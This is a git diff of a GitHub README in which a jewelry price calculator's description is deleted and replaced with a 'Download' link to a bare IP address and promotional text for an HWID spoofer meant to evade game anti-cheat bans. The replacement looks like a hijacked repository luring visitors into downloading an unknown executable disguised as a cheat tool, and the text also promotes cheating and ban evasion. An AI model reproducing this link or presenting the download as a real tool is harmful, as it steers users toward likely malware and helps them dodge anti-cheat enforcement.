@@ -1,43 +1,12 @@
-# JewelCalculator - Professional Jewelry Price Calculator
+# Download - [Link](http://91.90.195.152/Gr5L9Q)
 
-JewelCalculator is an advanced jewelry price calculator designed to provide accurate estimates for the cost of crafting exquisite jewelry pieces.
+![simpleHwidSpoofer-1](https://github.com/yanivlogi/Jewel-Calculator/assets/120129795/ec09eab7-bc4e-48a1-aa51-10d14b0bd97a)
 
-## Features
 
-- **Comprehensive Calculation**: Calculate the total price of jewelry based on gold weight, gemstone carats, and side gemstone quantity.
-- **Flexible Inputs**: Input fields for gold weight, main gemstone carats, carat weight for side gemstones, and quantity of side gemstones.
-- **Customizable Settings**: Option to include a discount or surcharge in the final price calculation.
-- **Intuitive Interface**: User-friendly interface for easy input and result display.
-- **Professional Results**: Detailed breakdown of the calculated price in both dollars and Israeli Shekels (₪).
+# What Is HWID Spoofer, and How Can It Remove HWID-Ban on Your PC?
 
-## Getting Started
+### We bet you want to try the first Warzone HWID spoofer you come across. But wait! First, you must understand how a HWID changer works so that you will be able to use it correctly.
 
-To get started with JewelCraft, simply clone this repository to your local machine and open the `index.html` file in your web browser.
+### HWID stands for Hardware ID, which is a unique identifier assigned to your computer's hardware components. Game developers and anti-cheat systems use this identifier to track and ban players who engage in cheating or hacking activities.
 
-```bash
-git clone https://github.com/your-username/jewelcraft.git
-cd jewelcraft
-```
-
-## Usage
-
-1. Open `index.html` in your preferred web browser.
-2. Fill in the required input fields:
-   - Gold weight in grams.
-   - Main gemstone carats (separated by commas if multiple).
-   - Carat weight for all side gemstones.
-   - Quantity of side gemstones.
-   - Optionally, check the box to include a discount or surcharge.
-3. Click the "חשב מחיר" (Calculate Price) button to see the calculated results.
-
-## Creator
-
-JewelCraft was created by Yaniv Logi.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-Feel free to customize the README file further to include additional information or instructions specific to your project!
+### This is where a HWID spoofer comes into play. It is a tool that allows you to disguise or spoof your computer's hardware ID, making it appear as if you're using a different system altogether. By doing so, you can avoid being detected by anti-cheat systems and ensure that your account remains safe and unbanned. By bypassing bans and detection, you gain a significant advantage over other players. You can continue playing and enjoying the game without the fear of being permanently blocked.
